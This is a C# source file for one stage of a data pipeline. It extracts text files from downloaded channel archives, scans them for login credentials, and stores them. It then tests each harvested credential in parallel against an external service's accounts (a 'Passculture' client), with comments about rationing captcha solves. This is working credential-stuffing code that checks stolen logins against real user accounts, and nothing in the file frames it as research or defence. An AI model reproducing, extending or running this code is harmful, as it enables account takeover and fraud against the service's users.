using System.Threading.Channels;
using System.IO;
using DataVortex.Core.Abstractions;
using DataVortex.Core.Accounts;
using DataVortex.Core.Configuration;
using DataVortex.Core.Models;
using Microsoft.Extensions.Logging;

namespace DataVortex.Core.Pipeline;

/// <summary>
/// Stage B of the pipeline: a bounded <see cref="Channel{T}"/> feeding its own worker pool, completely
/// independent of the download stage. Each worker extracts <c>*.txt</c> from archives, writes a JSON
/// metadata record, and raises <see cref="FileArchived"/>.
/// </summary>
public sealed class ProcessingPipeline
{
    private readonly IArchiveExtractor _extractor;
    private readonly IStorageService _storage;
    private readonly IMetricsService _metrics;
    private readonly ISettingsService _settings;
    private readonly DataVortex.Core.Passculture.PasscultureClient? _passClient;
    private readonly IAccountTestRegistry? _accounts;
    private readonly PauseGate _pauseGate;
    private readonly ILogger<ProcessingPipeline> _log;

    private readonly Channel<ProcessingJob> _channel;
    private readonly int _workerCount;
    private int _queueDepth;
    private Task[] _workers = Array.Empty<Task>();

    public event Action<ProcessingJob>? JobChanged;
    public event Action<FileRecord>? FileArchived;

    public int QueueDepth => Volatile.Read(ref _queueDepth);

    public ProcessingPipeline(
        IArchiveExtractor extractor, IStorageService storage, IMetricsService metrics, ISettingsService settings,
        PauseGate pauseGate, ILogger<ProcessingPipeline> log, int workerCount, int queueCapacity,
        DataVortex.Core.Passculture.PasscultureClient? passClient = null,
        IAccountTestRegistry? accounts = null)
    {
        _extractor = extractor;
        _storage = storage;
        _metrics = metrics;
        _settings = settings;
        _pauseGate = pauseGate;
        _log = log;
        _passClient = passClient;
        _accounts = accounts;
        _workerCount = Math.Max(1, workerCount);
        _channel = Channel.CreateBounded<ProcessingJob>(new BoundedChannelOptions(Math.Max(16, queueCapacity))
        {
            SingleReader = false,
            SingleWriter = false,
            FullMode = BoundedChannelFullMode.Wait
        });
    }

    public void Start(CancellationToken ct)
    {
        _workers = Enumerable.Range(0, _workerCount)
            .Select(i => Task.Run(() => WorkerLoop(i, ct), ct))
            .ToArray();
        _log.LogInformation("Processing pipeline started with {Workers} workers", _workerCount);
    }

    public async Task StopAsync()
    {
        _channel.Writer.TryComplete();
        try { await Task.WhenAll(_workers).ConfigureAwait(false); }
        catch { /* cancellation during shutdown */ }
    }

    public async ValueTask EnqueueAsync(ProcessingJob job, CancellationToken ct)
    {
        Interlocked.Increment(ref _queueDepth);
        _metrics.SetProcessingQueueDepth(QueueDepth);
        job.Status = ProcessingStatus.Queued;
        JobChanged?.Invoke(job);
        await _channel.Writer.WriteAsync(job, ct).ConfigureAwait(false);
    }

    private async Task WorkerLoop(int id, CancellationToken ct)
    {
        try
        {
            await foreach (var job in _channel.Reader.ReadAllAsync(ct).ConfigureAwait(false))
            {
                Interlocked.Decrement(ref _queueDepth);
                _metrics.SetProcessingQueueDepth(QueueDepth);
                await _pauseGate.WaitAsync(ct).ConfigureAwait(false);
                await ProcessJob(job, ct).ConfigureAwait(false);
            }
        }
        catch (OperationCanceledException) { }
        catch (Exception ex) { _log.LogError(ex, "Processing worker {Id} crashed", id); }
    }

    private async Task ProcessJob(ProcessingJob job, CancellationToken ct)
    {
        try
        {
            job.Status = ProcessingStatus.Processing;
            JobChanged?.Invoke(job);

            var destDir = Path.Combine(
                _storage.Paths.Extracted,
                $"{Sanitize(job.ChannelTitle)}_{job.ChannelId}",
                job.MessageId.ToString());

            // Default path: scan each matching *.txt for credentials straight from the archive stream, in
            // memory — nothing is written to disk, so no per-message folder and far less I/O at high volume.
            // Opt-in (KeepExtractedFiles) restores writing the *.txt under extracted/ for later browsing.
            var keepFiles = _settings.Current.KeepExtractedFiles;
            var credentials = new List<CredentialEntry>();

            ExtractionResult result;
            if (keepFiles)
            {
                result = await _extractor.ExtractTextFilesAsync(
                    job.LocalPath, destDir, job.MessageText, () => _metrics.ReportExtractedFile(), null, ct).ConfigureAwait(false);
                foreach (var path in result.ExtractedFiles)
                {
                    try
                    {
                        var found = Extraction.CredentialScanner.ScanFile(path);
                        if (found.Count > 0) credentials.AddRange(found);
                    }
                    catch { /* ignore scanning errors per-file */ }
                }
            }
            else
            {
                result = await _extractor.ExtractTextFilesAsync(
                    job.LocalPath, destDir, job.MessageText, () => _metrics.ReportExtractedFile(),
                    (_, stream, _) =>
                    {
                        try
                        {
                            var found = Extraction.CredentialScanner.ScanStream(stream);
                            if (found.Count > 0) credentials.AddRange(found);
                        }
                        catch { /* ignore scanning errors per-entry */ }
                        return Task.CompletedTask;
                    }, ct).ConfigureAwait(false);
            }

            job.Kind = result.Kind;
            job.ExtractedCount = result.ExtractedFiles.Count;
            job.Status = result.Errors.Count > 0
                ? ProcessingStatus.Failed
                : result.ExtractedFiles.Count == 0
                    ? ProcessingStatus.Ignored
                    : ProcessingStatus.Completed;
            if (result.Errors.Count > 0) job.Error = string.Join("; ", result.Errors);
            JobChanged?.Invoke(job);

            var record = new FileRecord
            {
                SourceChannelId = job.ChannelId,
                SourceChannelTitle = job.ChannelTitle,
                MessageId = job.MessageId,
                OriginalFileName = job.FileName,
                SizeBytes = job.SizeBytes,
                MimeType = job.MimeType,
                ReceivedUtc = job.ReceivedUtc,
                ProcessedUtc = DateTime.UtcNow,
                DownloadPath = job.LocalPath,
                Kind = result.Kind,
                Status = job.Status,
                // In-memory mode produces no files on disk, so the record carries no paths to point at.
                ExtractedTextFiles = keepFiles ? result.ExtractedFiles.ToList() : new List<string>(),
                Credentials = credentials,
                Error = job.Error
            };
            await _storage.SaveRecordAsync(record, ct).ConfigureAwait(false);

            // Test any new credentials — but at most ONCE per account, globally, via the registry
            // (atomic reservation before any backend call → never spends a captcha on a duplicate).
            if (_passClient is not null && _accounts is not null && record.Credentials is not null && record.Credentials.Count > 0)
            {
                var creds = record.Credentials;
                await Parallel.ForEachAsync(
                    Enumerable.Range(0, creds.Count),
                    new ParallelOptions { MaxDegreeOfParallelism = 10, CancellationToken = ct },
                    async (i, token) =>
                    {
                        creds[i] = await AccountTester.TestOnceAsync(_passClient, _accounts, creds[i], token).ConfigureAwait(false);
                    }).ConfigureAwait(false);
                await _storage.SaveRecordAsync(record, ct).ConfigureAwait(false);
            }

            FileArchived?.Invoke(record);
            // After metadata saved and notification sent, remove the downloaded archive and extracted txt files
            try
            {
                // Delete each extracted text file
                if (record.ExtractedTextFiles is not null)
                {
                    foreach (var f in record.ExtractedTextFiles)
                    {
                        try
                        {
                            if (!string.IsNullOrWhiteSpace(f) && File.Exists(f))
                            {
                                File.Delete(f);
                            }
                        }
                        catch (Exception ex)
                        {
                            _log.LogWarning(ex, "Failed to delete extracted file {File}", f);
                        }
                    }

                    // Try to remove the immediate parent directory if empty (message folder)
                    try
                    {
                        var first = record.ExtractedTextFiles.FirstOrDefault();
                        if (!string.IsNullOrWhiteSpace(first))
                        {
                            var parent = Path.GetDirectoryName(first) ?? string.Empty;
                            if (!string.IsNullOrEmpty(parent) && Directory.Exists(parent))
                            {
                                if (!Directory.EnumerateFileSystemEntries(parent).Any())
                                {
                                    Directory.Delete(parent);
                                    _log.LogInformation("Deleted empty extracted folder {Folder}", parent);
                                }
                            }
                        }
                    }
                    catch { /* best-effort cleanup */ }
                }

                // Delete the downloaded archive/file itself
                try
                {
                    if (!string.IsNullOrWhiteSpace(record.DownloadPath) && File.Exists(record.DownloadPath))
                    {
                        File.Delete(record.DownloadPath);
                        _log.LogInformation("Deleted downloaded file {File}", record.DownloadPath);
                    }
                }
                catch (Exception ex)
                {
                    _log.LogWarning(ex, "Failed to delete downloaded file {File}", record.DownloadPath);
                }
            }
            catch (Exception ex)
            {
                _log.LogError(ex, "Error while cleaning up files for {File}", job.FileName);
            }
            _metrics.ReportProcessingCompleted();
            _log.LogInformation("Processed {File}: kind={Kind}, extracted {Count} txt file(s)",
                job.FileName, result.Kind, result.ExtractedFiles.Count);
        }
        catch (OperationCanceledException) { }
        catch (Exception ex)
        {
            job.Status = ProcessingStatus.Failed;
            job.Error = ex.Message;
            JobChanged?.Invoke(job);
            _log.LogError(ex, "Processing failed for {File}", job.FileName);
        }
    }

    private static string Sanitize(string name)
    {
        if (string.IsNullOrWhiteSpace(name)) return "unknown";
        var invalid = Path.GetInvalidFileNameChars();
        var clean = new string(name.Select(c => invalid.Contains(c) ? '_' : c).ToArray()).Trim();
        return string.IsNullOrEmpty(clean) ? "unknown" : clean;
    }
}
